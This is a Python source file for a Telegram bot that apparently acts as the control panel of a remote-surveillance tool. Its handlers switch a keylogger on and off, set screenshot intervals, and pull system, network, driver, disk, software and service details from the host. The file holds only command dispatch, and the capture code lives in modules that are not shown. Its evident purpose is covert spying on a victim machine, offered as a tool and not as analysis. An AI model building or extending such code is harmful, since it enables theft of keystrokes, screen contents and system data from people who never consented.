import module.commands as command
import module.callback_data as callback


class CONTROL:

    @staticmethod
    def commands(bot, id):

        @bot.message_handler(commands=['status', "me"])
        async def status(message):
            await command.status(bot, id, message)

        @bot.message_handler(commands=['keylogger', "key"], func=lambda message: True )
        async def config_keylogger(message):
            await command.keylogger_show_menu(bot, id)

        @bot.message_handler(commands=['screenshot', "captura", "foto"], func=lambda message: True)
        async def config_screenshot(message):
            await command.screenshot_show_menu(bot, id)

        @bot.message_handler(commands=['information', 'info'])
        async def information(message):
            await command.information_menu(bot, id)

        @bot.message_handler(func=lambda message: True)
        async def echo_all(message):
            await command.start(bot, id, message)

        @bot.callback_query_handler(func=lambda call: call.data == 'keylogger_active')
        async def keylogger_active(call):
            await callback.keylogger_active(bot, id, call)

        @bot.callback_query_handler(func=lambda call: call.data == 'keylogger_disable')
        async def keylogger_disable(call):
            await callback.keylogger_disable(bot, id, call)

        @bot.callback_query_handler(func=lambda call: call.data == 'keylogger_time')
        async def keylogger_time(call):
            await callback.keylogger_time(bot, id, call)

        @bot.callback_query_handler(func=lambda call: call.data == 'screenshot_active')
        async def screenshot_active(call):
            await callback.screenshot_active(bot, id, call)

        @bot.callback_query_handler(func=lambda call: call.data == 'screenshot_disable')
        async def screenshot_disable(call):
            await callback.screenshot_disable(bot, id, call)

        @bot.callback_query_handler(func=lambda call: call.data == 'screenshot_interval')
        async def screenshot_interval(call):
            await callback.screenshot_show_menu_interval(bot, id, call)

        @bot.callback_query_handler(func=lambda call: call.data == 'information_dns')
        async def information_dns(call):
            await callback.information_dns(bot, id, call)

        @bot.callback_query_handler(func=lambda call: call.data == 'information_red')
        async def information_red(call):
            await callback.information_red(bot, id, call)

        @bot.callback_query_handler(func=lambda call: call.data == 'information_ip')
        async def information_ip(call):
            await callback.information_ip(bot, id, call)

        @bot.callback_query_handler(func=lambda call: call.data == 'information_sys')
        async def information_sys(call):
            await callback.information_sys(bot, id, call)

        @bot.callback_query_handler(func=lambda call: call.data == 'information_driver')
        async def information_driver(call):
            await callback.information_driver(bot, id, call)

        @bot.callback_query_handler(func=lambda call: call.data == 'list_hard_disk')
        async def list_hard_disk(call):
            await callback.list_hard_disk(bot, id, call)

        @bot.callback_query_handler(func=lambda call: call.data == 'information_current_software')
        async def information_current_software(call):
            await callback.information_current_software(bot, id, call)

        @bot.callback_query_handler(func=lambda call: call.data == 'information_current_services')
        async def information_current_services(call):
            await callback.information_current_services(bot, id, call)

        @bot.callback_query_handler(func=lambda call: True)
        async def callback_query(call):
            await command.callback_query_others(bot, id, call)



